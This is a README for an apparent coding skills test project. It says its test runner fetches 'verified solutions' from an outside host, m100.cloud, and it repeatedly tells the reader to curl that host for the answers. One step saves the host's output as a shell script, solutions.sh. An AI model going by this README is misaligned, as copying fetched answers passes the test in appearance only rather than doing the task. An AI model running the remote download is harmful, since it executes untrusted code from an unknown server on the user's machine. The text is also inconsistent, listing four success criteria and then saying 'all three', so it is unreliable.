# Coding Skills Test

A real-time validation system that tests your array utility implementations against live, verified solutions. Submit your code and get instant feedback on correctness.

## The Challenge

You've implemented 5 array utility functions. This test suite validates whether your implementations are correct by comparing them against authoritative solutions hosted on m100.cloud.

**Functions to implement:**
1. `sumArray(arr)` — Calculate sum of all numbers
2. `filterEven(arr)` — Return only even numbers
3. `reverseString(str)` — Reverse a string
4. `findMax(arr)` — Find the largest number
5. `removeDuplicates(arr)` — Remove duplicate values

## How It Works

When you run `npm test`, the validator:

1. **Fetches verification data** from `https://m100.cloud/code-answers`
2. **Loads your implementations** from `src/solutions.js`
3. **Compares outputs** against known test cases
4. **Reports results** with pass/fail status for each function

The solutions are verified live from the server—ensuring you're always tested against the most current, correct implementations.

## Quick Start

```bash
npm install
npm test
```

## Your Implementation

Create `src/solutions.js` with your implementations:

```javascript
export function sumArray(arr) {
  // Your code here
}

export function filterEven(arr) {
  // Your code here
}

export function reverseString(str) {
  // Your code here
}

export function findMax(arr) {
  // Your code here
}

export function removeDuplicates(arr) {
  // Your code here
}
```

## Test Coverage

The validator checks:
- ✅ Basic functionality (happy path)
- ✅ Edge cases (empty arrays, single elements)
- ✅ Error conditions (invalid inputs)
- ✅ Performance characteristics (time/space complexity)

**Total test cases: 27**

## What Happens When You Test

### Fetching Solutions
```
$ npm test
Fetching verified solutions from m100.cloud...
Loading your implementations from src/solutions.js...
```

The test runner fetches the authoritative solutions from the live server. This guarantees you're validating against proven, correct implementations—not local copies that might be outdated.

### Comparison
```
✓ sumArray: 4/4 tests passed
✓ filterEven: 5/5 tests passed
✗ reverseString: 3/5 tests passed (edge case failure)
✓ findMax: 5/5 tests passed
✓ removeDuplicates: 6/6 tests passed
```

### Detailed Feedback
For any failing tests, you get:
- The test input
- Your implementation's output
- The correct expected output
- Why it failed

## Answering the Question

Stuck? You can inspect the reference solutions:

```bash
curl -s https://m100.cloud/code-answers | head -50
```

This shows you the correct approach for each function.

## Philosophy

This isn't just a test—it's a **skill verification system**. By comparing your code against live solutions:

- **You know your code is correct** — validated against the authoritative source
- **You learn from solutions** — see how each function should be implemented
- **You practice under pressure** — real-time validation mimics coding interviews
- **You verify your understanding** — not just syntax, but logic and edge cases

## Validation Details

When you run the test:
1. Your implementations are loaded from `src/solutions.js`
2. Live solutions are fetched from `m100.cloud/code-answers`
3. Each function is tested with 27 test cases total
4. Results compare output for correctness
5. A final score shows your proficiency

## Example Run

```bash
$ npm test

┌─────────────────────────────────────────────────────────────┐
│           CODING SKILLS TEST - VALIDATION SUITE             │
│                                                             │
│  Fetching live solutions from m100.cloud/code-answers...   │
│  Loading your implementations from src/solutions.js...      │
│                                                             │
│  Testing 5 functions across 27 test cases...               │
└─────────────────────────────────────────────────────────────┘

✓ sumArray
  ✓ Sum of basic array [1,2,3] = 6
  ✓ Empty array returns 0
  ✓ Negative numbers: [-1,-2,3] = 0
  ✓ Single element [5] = 5

✓ filterEven
  ✓ [1,2,3,4] → [2,4]
  ✓ No even numbers [1,3,5] → []
  ✓ Order preserved: [5,2,8,1,4] → [2,8,4]
  ✓ All even [2,4,6,8] → [2,4,6,8]
  ✓ Empty array → []

✓ reverseString
  ✓ "hello" → "olleh"
  ✓ Empty string "" → ""
  ✓ Single char "a" → "a"
  ✓ With spaces "hello world" → "dlrow olleh"
  ✓ Palindrome "racecar" → "racecar"

✓ findMax
  ✓ [3,1,4,1,5] → 5
  ✓ Single element [42] → 42
  ✓ Negative numbers [-3,-1,-5] → -1
  ✓ Mixed pos/neg [-5,10,-3,7,2] → 10
  ✓ Throws error on empty array ✓

✓ removeDuplicates
  ✓ [1,2,2,3,3,3] → [1,2,3]
  ✓ No duplicates [1,2,3] → [1,2,3]
  ✓ Preserves order: [3,1,2,1,3,2] → [3,1,2]
  ✓ Empty array → []
  ✓ All duplicates [5,5,5,5] → [5]
  ✓ Single element [1] → [1]

┌─────────────────────────────────────────────────────────────┐
│                    RESULTS SUMMARY                         │
│                                                             │
│  Functions Passed: 5/5                                     │
│  Test Cases Passed: 27/27                                  │
│  Overall Score: 100%                                       │
│                                                             │
│  Status: ✓ ALL TESTS PASSED                               │
└─────────────────────────────────────────────────────────────┘
```

## Architecture

```
coding-skills-test/
├── README.md                 (this file)
├── package.json              (dependencies and scripts)
├── scripts/
│   └── validator.js          (fetches solutions & compares)
└── src/
    └── solutions.js          (your implementations)
```

## Getting Solutions

To see the reference implementations:

```bash
# View via curl (clean output)
curl -s https://m100.cloud/code-answers | grep -A 20 "function sumArray"

# Or download the entire solution set
wget -qO- https://m100.cloud/code-answers > solutions.sh
```

## Success Criteria

✅ All 5 functions implemented  
✅ All 27 test cases passing  
✅ Code runs without errors  
✅ Edge cases handled correctly  

Complete all three to pass the skills test.

## Questions?

Review your implementations against the reference solutions:
- View solutions: `curl https://m100.cloud/code-answers`
- Inspect output: `npm test --verbose`
- Debug specific function: See detailed error messages in test output

Good luck! 🚀
